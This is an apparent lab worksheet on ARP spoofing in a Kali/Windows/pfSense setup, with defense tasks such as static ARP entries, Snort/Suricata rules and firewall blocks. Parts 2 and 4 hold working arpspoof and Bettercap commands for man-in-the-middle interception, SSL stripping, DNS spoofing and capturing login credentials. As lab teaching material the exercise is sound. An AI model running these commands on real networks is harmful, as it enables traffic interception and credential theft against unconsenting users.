###  ARP Spoofing Attack & Defense**


##  Part 1: Capture Baseline (No Attack)

### On Windows:

1. Open **Command Prompt** and run:

   ```bash
   arp -a
   ```

   → Take a screenshot.

2. Open **Wireshark** → Select the Ethernet adapter.

3. Browse some websites (HTTP and HTTPS like `example.com`, `httpbin.org`, etc.)

4. Stop capture → Save it as `baseline.pcapng`



##  Part 2: ARP Spoofing Attack (Kali Linux)

### Option A: Using arpspoof

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Spoof Windows -> pfSense
arpspoof -t <Windows_IP> <pfSense_IP>

# Open a second terminal
arpspoof -t <pfSense_IP> <Windows_IP>
```

### Option B: Using Bettercap

```bash
sudo bettercap -iface eth0
# In Bettercap prompt:
set arp.spoof.targets <Windows_IP>
arp.spoof on
net.sniff on
```



##  Part 3: Monitor Results

### On Windows:

* Run:

  ```bash
  arp -a
  ```

  → Observe if the pfSense MAC has changed to attacker’s MAC.

* Open **Wireshark**:

  * Check for duplicate IPs
  * Look for packets with attacker MAC

### On Kali:

* Use Wireshark to see traffic from Windows → pfSense
* Try to capture HTTP login credentials



##  Part 4: HTTPS Downgrade or DNS Spoofing (Optional)

### In Bettercap:

```bash
http.proxy on
http.proxy.sslstrip on
net.sniff on
dns.spoof on
set dns.spoof.domains facebook.com
set dns.spoof.address <Kali_IP>
```

### Try to:

* Visit `http://testphp.vulnweb.com`
* Enter test credentials → Capture in Bettercap logs or Wireshark



##  Part 5: Defense Tasks

###  A. Static ARP Entry on Windows

```powershell
netsh interface ipv4 add neighbors "Ethernet" <pfSense_IP> <Real pfSense_MAC>
```

* Re-run ARP spoofing attack → Confirm no changes in `arp -a`.



###  B. pfSense Detection & Blocking

#### 1. View ARP Table

* **Status → ARP Table**
* Check for multiple IPs with same MAC

#### 2. Install & Configure Snort/Suricata

* Go to **System → Package Manager → Available Packages**
* Install **Snort** or **Suricata**
* Enable on LAN interface
* Add rules for:

  * **ARP Spoofing**
  * **DNS Spoofing**
  * **MITM**

#### 3. Block Attacker

* Go to **Firewall → Rules → LAN**
* Add rule to **Block source IP or MAC** of attacker (Kali)
* Save and Apply



##  Part 6: Cleanup & Report

1. **Stop Bettercap/arpspoof** on Kali
2. Remove static ARP on Windows:

```powershell
netsh interface ipv4 delete neighbors "Ethernet" <pfSense_IP>
```

3. Turn off IP forwarding on Kali:

```bash
echo 0 > /proc/sys/net/ipv4/ip_forward
```

4. Save all **Wireshark captures**



